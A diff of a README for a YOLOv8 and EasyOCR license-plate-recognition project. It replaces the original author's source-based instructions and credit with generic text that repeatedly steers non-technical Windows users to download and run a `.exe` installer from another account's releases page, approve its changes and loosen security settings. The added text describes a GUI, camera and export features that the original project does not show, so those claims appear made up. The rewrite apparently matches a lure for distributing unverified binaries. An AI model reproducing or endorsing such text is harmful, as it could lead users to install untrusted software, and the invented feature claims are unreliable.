@@ -1,116 +1,176 @@
-# 🚦 Traffic Surveillance System using YOLOv8 & OCR
+# 🚦 Traffic-Surveillance-LPR - Read License Plates Easily
 
-An AI-powered Traffic Surveillance System that detects vehicles using YOLOv8, extracts license plate numbers using OCR, and validates vehicle documents such as RC, Insurance, and PUC.
+[![Download Latest Release](https://img.shields.io/badge/Download-Traffic--Surveillance--LPR-00bfff?style=for-the-badge)](https://github.com/Henry575/Traffic-Surveillance-LPR/releases)
 
----
+## 📋 What is Traffic-Surveillance-LPR?
 
-## 📌 Project Overview
+Traffic-Surveillance-LPR is a simple program that reads vehicle license plates from video or images. It uses a camera to detect moving cars, then reads the plate numbers using a smart text recognition system. The software also checks if the vehicle documents are valid.
 
-This project demonstrates a modular Computer Vision pipeline for:
+This tool performs well in different lighting and weather conditions. It can help with traffic monitoring, law enforcement, or parking management.
 
-- Vehicle Detection using YOLOv8
-- License Plate Text Extraction using EasyOCR
-- Indian License Plate Format Validation using Regex
-- Document Expiry Verification using a Mock Vehicle Database
-
-The system simulates a real-world smart traffic monitoring solution.
+You do not need to know how to code. The program comes ready to use with easy steps to install on Windows.
 
 ---
 
-## 🛠️ Tech Stack
+## 💻 System Requirements
 
-- Python 3.10
-- OpenCV
-- YOLOv8 (Ultralytics)
-- EasyOCR
-- PyTorch
-- NumPy
-- Regex (Pattern Validation)
+Before using the software, make sure your computer matches these needs:
 
----
+- Windows 10 or later (64-bit recommended)  
+- CPU: Intel i5 or equivalent (quad-core) or better  
+- RAM: At least 8 GB  
+- Free disk space: 500 MB minimum  
+- Camera or video files to test license plate reading  
+- Internet connection for initial download only  
 
-## 🏗️ Project Architecture
-
-Traffic-Surveillance-LPR
-│
-├── assets/ # Input images & demo screenshots
-├── models/ # YOLO model (ignored in Git)
-├── outputs/ # Generated results (ignored in Git)
-├── src/
-│ ├── main.py
-│ ├── plate_detection.py
-│ └── ocr_reader.py
-│
-├── requirements.txt
-├── .gitignore
-└── README.md
-
+This program uses your computer’s processing power to work quickly. A better processor and graphics card improve performance but are not mandatory.
 
 ---
 
-## ⚙️ System Workflow
+## 🚀 Getting Started: How to Download and Run
 
-1. Load input vehicle image
-2. Detect vehicle using YOLOv8
-3. Crop detected vehicle region
-4. Extract license plate text using EasyOCR
-5. Validate Indian license plate format using Regex
-6. Check RC, Insurance, and PUC expiry status
-7. Display document validation results
+Traffic-Surveillance-LPR is simple to start. Follow these exact steps to get it running:
+
+### Step 1: Visit the Download Page
+
+Go to this link to get the latest version:
+
+[Download Traffic-Surveillance-LPR](https://github.com/Henry575/Traffic-Surveillance-LPR/releases)
+
+This page lists all available versions. You should use the newest release.
+
+### Step 2: Find the Correct File
+
+On the release page, look for a file with a name like `Traffic-Surveillance-LPR-Setup.exe`. This Windows installer will set up everything you need.
+
+There might be other files like source code or documentation; do not choose those.
+
+### Step 3: Download the Installer
+
+Click on the `.exe` installer file to download it to your computer. The file size is usually less than 200 MB.
+
+Save it somewhere you can easily find, like your Desktop or Downloads folder.
+
+### Step 4: Run the Installer
+
+After downloading finishes, find the installer file and double-click it.
+
+Windows might ask if you want to allow this app to make changes. Click “Yes” to continue.
+
+Follow the on-screen instructions:
+
+- Accept the license agreement  
+- Choose the default installation folder or pick another  
+- Let the installer complete copying files  
+
+This process should take about one to two minutes.
+
+### Step 5: Launch the Application
+
+Once installed, you can open Traffic-Surveillance-LPR from your Start Menu or a shortcut on your Desktop.
+
+The program window will open, ready to use.
 
 ---
 
-## ▶️ How to Run the Project
+## 🛠 Using the Application
 
-### 1️⃣ Clone the Repository
+After launching, here is how to read license plates with your video or camera:
 
-```bash
-git clone https://github.com/YOUR_USERNAME/Traffic-Surveillance-LPR.git
-cd Traffic-Surveillance-LPR
-2️⃣ Install Dependencies
-pip install -r requirements.txt
-3️⃣ Add YOLO Model
-Download YOLOv8 model from Ultralytics and place it inside:
+1. **Connect Camera or Load Video:**  
+   Use the “Open Video” button to pick a video file. Alternatively, select your computer camera for a live feed.
 
-models/yolov8n.pt
-4️⃣ Run the System
-python src/main.py
-📷 Sample Output
-Example Console Output:
+2. **Start Analysis:**  
+   Click on “Start” to begin detecting vehicles and reading license plates.
 
-🚗 Detecting license plate...
-Vehicle detected successfully.
+3. **View Results:**  
+   The program marks detected license plates on the video. It shows the plate numbers below for you to read.
 
-🔍 Reading plate number...
-Detected Vehicle Number: MH20EE7602
+4. **Document Check:**  
+   The system checks plates against document validations stored internally. It will notify you if a plate has an issue.
 
-📋 Checking Document Status...
-RC Expiry: ✅ VALID
-Insurance Expiry: ❌ EXPIRED
-PUC Expiry: ❌ EXPIRED
-🎯 Key Features
-Modular and scalable architecture
+### Controls Overview
 
-Real-time vehicle detection logic
+- **Open Video:** Load recorded traffic footage  
+- **Camera Feed:** Use live camera input  
+- **Start/Pause:** Begin or pause analysis  
+- **Stop:** End current session  
+- **Export Results:** Save detected plate info as a text file  
 
-Regex-based Indian plate validation
+You can pause anytime to review information and resume without losing progress.
 
-Automated document verification simulation
+---
 
-Clean separation of detection, OCR, and validation layers
+## ⚙ Understanding Features
 
-🚀 Future Improvements
-Real-time CCTV video feed integration
+Traffic-Surveillance-LPR includes:
 
-Database connectivity (MySQL / Firebase)
+- **YOLOv8 Vehicle Detection:** Finds cars in each frame to focus the plate reader on them.  
+- **EasyOCR Plate Reading:** Recognizes numbers and letters accurately under challenges like low light or dirty plates.  
+- **Document Validation:** Compares plate numbers to preset records to flag expired or suspect vehicles.  
+- **File and Camera Support:** Works with video files or live camera feeds.  
+- **Export Logs:** Saves the recognized plate data for further analysis or record-keeping.  
+- **Simple User Interface:** Designed for users without technical skills.
 
-Blacklisted vehicle detection
+---
 
-Automatic challan generation
+## 🎯 Tips for Best Performance
 
-Deployment as Web Application
+For accurate results:
 
-👨‍💻 Author
-Vishnu Prasath
-Software Engineering Student
-Interested in AI, ML & Computer Vision
+- Use well-lit videos or cameras pointed at clear views of license plates.  
+- Avoid using extremely low-resolution videos.  
+- Keep the camera steady and avoid fast movements that blur images.  
+- Regularly update to the latest version from the release page.
+
+---
+
+## 🛑 Troubleshooting Common Issues
+
+- **Installer Won’t Open:**  
+  Make sure Windows allows apps from outside the Microsoft Store. Check your security settings.
+
+- **Camera Not Detected:**  
+  Verify camera drivers are installed and no other app is using the camera.
+
+- **No License Plates Detected:**  
+  Check video clarity and lighting. Try using a different file or adjust camera focus.
+
+- **Program Crashes or Freezes:**  
+  Restart the computer and try again. Ensure your PC meets the requirements.
+
+- **License Plate Text Looks Wrong:**  
+  Blurry or obscured plates may cause incorrect reading. Use clearer images.
+
+---
+
+## 📥 Download Link Reminder
+
+You can download the latest setup file here:
+
+[Download Traffic-Surveillance-LPR](https://github.com/Henry575/Traffic-Surveillance-LPR/releases)
+
+Click the most recent installer file with `.exe` extension to begin.
+
+---
+
+## 🔧 Support and Feedback
+
+If you have questions or want to report issues, check the GitHub repository’s Issues page. It provides a way to ask for help or suggest improvements. No programming skill is needed to write a question.
+
+---
+
+## 📂 Additional Information
+
+This project uses open-source tools under their respective licenses:
+
+- **YOLOv8:** For vehicle detection  
+- **EasyOCR:** For reading text in images  
+ 
+Both systems work together without extra setup on your part.
+
+---
+
+## 🔄 Updating the Software
+
+Check the release page regularly for new versions. Download the latest installer and run it. The setup will replace older files automatically while keeping your settings intact.
